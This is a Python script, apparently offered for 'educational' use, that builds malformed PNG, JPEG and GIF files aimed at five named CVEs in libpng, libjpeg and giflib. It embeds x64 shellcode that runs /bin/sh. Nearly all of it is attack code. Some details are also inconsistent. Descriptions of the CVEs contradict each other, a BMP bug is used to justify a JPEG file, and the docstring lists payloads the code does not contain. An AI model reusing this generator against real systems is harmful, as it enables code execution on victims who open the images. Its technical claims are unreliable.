#!/usr/bin/env python3
"""
Exploit Header Generator for Polyglot Images
=============================================
Generates malicious image headers that exploit known CVEs in image parsing libraries.

EDUCATIONAL/RESEARCH USE ONLY
This demonstrates image viewer exploitation techniques.

Supported CVEs:
- CVE-2015-8540 (libpng) - Buffer overflow in png_check_chunk_name
- CVE-2019-7317 (libpng) - Out-of-bounds access in png_image_finish_read
- CVE-2018-14498 (libjpeg) - Heap buffer over-read
- CVE-2019-15133 (giflib) - Division by zero / out-of-bounds read
- CVE-2016-3977 (giflib) - Heap buffer overflow

Author: SWORDIntel
Date: 2025-11-08
"""

import sys
import struct
import argparse
from pathlib import Path


class ExploitHeaderGenerator:
    """Generates malicious image headers for CVE exploitation"""

    def __init__(self):
        self.exploits = {
            'CVE-2015-8540': self._cve_2015_8540_libpng,
            'CVE-2019-7317': self._cve_2019_7317_libpng,
            'CVE-2018-14498': self._cve_2018_14498_libjpeg,
            'CVE-2019-15133': self._cve_2019_15133_giflib,
            'CVE-2016-3977': self._cve_2016_3977_giflib,
        }

    def _cve_2015_8540_libpng(self, shellcode):
        """
        CVE-2015-8540: libpng buffer overflow in png_check_chunk_name

        Vulnerability: libpng 1.6.x allows remote attackers to cause DoS or
        possibly have unspecified other impact via a chunk name that is too long.

        Exploit: Create PNG with malformed chunk name (> 4 bytes)
        """
        png_header = b'\x89PNG\r\n\x1a\n'  # PNG signature

        # IHDR chunk (valid)
        ihdr_data = struct.pack('>IIBBBBB',
            1, 1,  # Width, height (1x1)
            8, 2,  # Bit depth, color type (RGB)
            0, 0, 0  # Compression, filter, interlace
        )
        ihdr_chunk = struct.pack('>I', len(ihdr_data)) + b'IHDR' + ihdr_data
        ihdr_crc = self._crc32(b'IHDR' + ihdr_data)
        ihdr_chunk += struct.pack('>I', ihdr_crc)

        # Malicious chunk with oversized name (triggers overflow)
        # Chunk name should be 4 bytes, we send much more to overflow buffer
        malicious_chunk_name = b'AAAA' * 64  # 256 bytes instead of 4

        # Embed shellcode in chunk data
        chunk_data = shellcode + b'\x00' * (256 - len(shellcode))

        malicious_chunk = struct.pack('>I', len(chunk_data))
        malicious_chunk += malicious_chunk_name[:256]  # Oversized name
        malicious_chunk += chunk_data
        # Intentionally wrong CRC to avoid other checks
        malicious_chunk += b'\x00\x00\x00\x00'

        # IEND chunk
        iend_chunk = b'\x00\x00\x00\x00IEND\xae\x42\x60\x82'

        return png_header + ihdr_chunk + malicious_chunk + iend_chunk

    def _cve_2019_7317_libpng(self, shellcode):
        """
        CVE-2019-7317: libpng out-of-bounds access

        Vulnerability: Use-after-free in png_image_free

        Exploit: Crafted PNG with specific chunk ordering causes memory corruption
        """
        png_header = b'\x89PNG\r\n\x1a\n'

        # IHDR with large dimensions to trigger allocation
        ihdr_data = struct.pack('>IIBBBBB',
            0xFFFF, 0xFFFF,  # Huge dimensions (will fail allocation)
            8, 6,  # RGBA
            0, 0, 0
        )
        ihdr = self._make_chunk(b'IHDR', ihdr_data)

        # tRNS chunk before PLTE (invalid order, triggers use-after-free)
        trns_data = b'\x00\x00\x00\xFF' * 64
        trns = self._make_chunk(b'tRNS', trns_data)

        # Shellcode in iCCP chunk (embedded in chunk data)
        iccp_data = b'profile\x00\x00' + shellcode + b'\x00' * (1024 - len(shellcode))
        iccp = self._make_chunk(b'iCCP', iccp_data)

        iend = b'\x00\x00\x00\x00IEND\xae\x42\x60\x82'

        return png_header + ihdr + trns + iccp + iend

    def _cve_2018_14498_libjpeg(self, shellcode):
        """
        CVE-2018-14498: libjpeg heap buffer over-read

        Vulnerability: get_8bit_row in rdbmp.c allows remote attackers to
        cause DoS via crafted BMP file.

        Exploit: Malformed JPEG with embedded shellcode in comment marker
        """
        # JPEG SOI
        jpeg = b'\xff\xd8'

        # APP0 marker (JFIF)
        app0 = b'\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
        jpeg += app0

        # Comment marker with shellcode (COM segment)
        com_data = shellcode + b'\x00' * (65530 - len(shellcode))
        com = b'\xff\xfe' + struct.pack('>H', len(com_data) + 2) + com_data
        jpeg += com

        # Malformed DQT (quantization table) - triggers heap overflow
        # Size field is incorrect, causes over-read
        dqt = b'\xff\xdb'  # DQT marker
        dqt += b'\xff\xff'  # Intentionally huge size (65535 bytes)
        dqt += b'\x00' * 64  # Actual data much smaller
        jpeg += dqt

        # SOF0 (Start of frame) - minimal valid frame
        sof0 = b'\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00'
        jpeg += sof0

        # SOS (Start of scan)
        sos = b'\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00'
        jpeg += sos

        # Image data (minimal)
        jpeg += b'\xff\x00' * 10

        # EOI
        jpeg += b'\xff\xd9'

        return jpeg

    def _cve_2019_15133_giflib(self, shellcode):
        """
        CVE-2019-15133: GIF LIB division by zero

        Vulnerability: DGifSlurp in dgif_lib.c allows attackers to cause DoS
        via crafted GIF with width/height of 0.

        Exploit: GIF with zero dimensions and shellcode in comment extension
        """
        gif = b'GIF89a'  # GIF header

        # Logical screen descriptor with zero dimensions (triggers division by zero)
        gif += struct.pack('<HH', 0, 0)  # Width=0, Height=0
        gif += b'\x80'  # Global color table flag
        gif += b'\x00'  # Background color
        gif += b'\x00'  # Pixel aspect ratio

        # Global color table (minimal)
        gif += b'\x00\x00\x00\xff\xff\xff'  # 2 colors

        # Comment extension with shellcode
        gif += b'\x21\xfe'  # Comment extension

        # Split shellcode into 255-byte blocks
        for i in range(0, len(shellcode), 255):
            block = shellcode[i:i+255]
            gif += bytes([len(block)]) + block

        gif += b'\x00'  # Terminator

        # Image descriptor (malformed)
        gif += b'\x2c'  # Image separator
        gif += b'\x00\x00\x00\x00'  # Left, Top
        gif += struct.pack('<HH', 1, 1)  # Width, Height
        gif += b'\x00'  # Flags

        # Image data (minimal)
        gif += b'\x02\x02\x44\x01\x00'

        # GIF trailer
        gif += b'\x3b'

        return gif

    def _cve_2016_3977_giflib(self, shellcode):
        """
        CVE-2016-3977: GIF heap buffer overflow

        Vulnerability: Heap overflow in gif2rgb via crafted GIF file

        Exploit: GIF with malformed local color table size
        """
        gif = b'GIF89a'

        # Logical screen descriptor
        gif += struct.pack('<HH', 1, 1)
        gif += b'\xf0'  # Global color table: yes, 8 colors (3 bits)
        gif += b'\x00\x00'

        # Global color table (2^3 = 8 colors)
        gif += b'\x00\x00\x00' * 8

        # Application extension with shellcode
        gif += b'\x21\xff\x0b'  # Application extension
        gif += b'NETSCAPE2.0'

        # Shellcode in application data
        for i in range(0, len(shellcode), 255):
            block = shellcode[i:i+255]
            gif += bytes([len(block)]) + block
        gif += b'\x00'

        # Image descriptor with malformed local color table
        gif += b'\x2c\x00\x00\x00\x00'
        gif += struct.pack('<HH', 256, 256)  # Large dimensions
        gif += b'\x87'  # Local color table: yes, 256 colors (INTENTIONALLY WRONG SIZE)

        # Local color table buffer overflow
        # Claim 256 colors but provide much more data
        gif += b'\x41\x41\x41' * 512  # 512 * 3 = 1536 bytes instead of 768

        # Image data
        gif += b'\x08'  # LZW minimum code size
        gif += b'\x00'  # Data sub-block (empty)

        gif += b'\x3b'  # Trailer

        return gif

    def _make_chunk(self, name, data):
        """Create PNG chunk with proper CRC"""
        chunk = struct.pack('>I', len(data)) + name + data
        crc = self._crc32(name + data)
        return chunk + struct.pack('>I', crc)

    def _crc32(self, data):
        """Calculate CRC32 for PNG chunks"""
        import zlib
        return zlib.crc32(data) & 0xffffffff

    def generate_shellcode(self, payload_type='exec_sh'):
        """
        Generate shellcode payloads

        Args:
            payload_type: Type of shellcode (exec_sh, reverse_shell, download_exec)

        Returns:
            bytes: Shellcode
        """
        shellcodes = {
            # Execute /bin/sh
            'exec_sh': bytes([
                0x48, 0x31, 0xd2,                          # xor rdx, rdx
                0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69,        # mov rbx, '//bin/sh'
                0x6e, 0x2f, 0x73, 0x68,
                0x48, 0xc1, 0xeb, 0x08,                    # shr rbx, 8
                0x53,                                       # push rbx
                0x48, 0x89, 0xe7,                          # mov rdi, rsp
                0x50,                                       # push rax
                0x57,                                       # push rdi
                0x48, 0x89, 0xe6,                          # mov rsi, rsp
                0xb0, 0x3b,                                # mov al, 0x3b (execve)
                0x0f, 0x05                                 # syscall
            ]),

            # NOP sled (for testing)
            'nop_sled': b'\x90' * 128,

            # POC marker (non-executable, just marks successful overflow)
            'poc_marker': b'SHELLCODE_EXECUTED_HERE!' * 10,
        }

        return shellcodes.get(payload_type, shellcodes['poc_marker'])

    def generate_exploit(self, cve_id, output_path, payload_type='poc_marker'):
        """
        Generate exploit image

        Args:
            cve_id: CVE identifier
            output_path: Where to save exploit file
            payload_type: Type of shellcode payload
        """
        if cve_id not in self.exploits:
            raise ValueError(f"Unknown CVE: {cve_id}")

        # Generate shellcode
        shellcode = self.generate_shellcode(payload_type)

        # Generate exploit
        exploit_func = self.exploits[cve_id]
        exploit_data = exploit_func(shellcode)

        # Write to file
        with open(output_path, 'wb') as f:
            f.write(exploit_data)

        print(f"[+] Exploit generated: {output_path}")
        print(f"    CVE: {cve_id}")
        print(f"    Payload: {payload_type}")
        print(f"    Size: {len(exploit_data)} bytes")
        print(f"    Shellcode size: {len(shellcode)} bytes")
        print(f"\n[*] This exploit targets:")

        targets = {
            'CVE-2015-8540': 'libpng 1.6.x - Buffer overflow in chunk name',
            'CVE-2019-7317': 'libpng - Use-after-free in image handling',
            'CVE-2018-14498': 'libjpeg - Heap buffer over-read',
            'CVE-2019-15133': 'giflib - Division by zero',
            'CVE-2016-3977': 'giflib - Heap buffer overflow',
        }

        print(f"    {targets.get(cve_id, 'Unknown target')}")

        return output_path


def main():
    parser = argparse.ArgumentParser(
        description='Generate exploit image headers for CVE testing',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Supported CVEs:
  CVE-2015-8540    libpng buffer overflow
  CVE-2019-7317    libpng use-after-free
  CVE-2018-14498   libjpeg heap over-read
  CVE-2019-15133   giflib division by zero
  CVE-2016-3977    giflib heap overflow

Payload Types:
  poc_marker       Safe PoC marker (default)
  nop_sled         NOP sled for testing
  exec_sh          Execute /bin/sh (x64 Linux)

Examples:
  # Generate safe PoC exploit
  %(prog)s CVE-2015-8540 exploit.png

  # Generate with NOP sled
  %(prog)s CVE-2019-15133 exploit.gif -p nop_sled

  # Generate with shellcode (DANGEROUS!)
  %(prog)s CVE-2018-14498 exploit.jpg -p exec_sh

WARNING: Only test on systems you own or have authorization to test!
These exploits can crash applications or execute arbitrary code!
        """
    )

    parser.add_argument('cve', help='CVE identifier (e.g., CVE-2015-8540)')
    parser.add_argument('output', help='Output file path')
    parser.add_argument('-p', '--payload', default='poc_marker',
                       choices=['poc_marker', 'nop_sled', 'exec_sh'],
                       help='Shellcode payload type')

    args = parser.parse_args()

    generator = ExploitHeaderGenerator()

    try:
        generator.generate_exploit(args.cve, args.output, args.payload)
        return 0
    except Exception as e:
        print(f"[!] Error: {e}", file=sys.stderr)
        import traceback
        traceback.print_exc()
        return 1


if __name__ == '__main__':
    sys.exit(main())
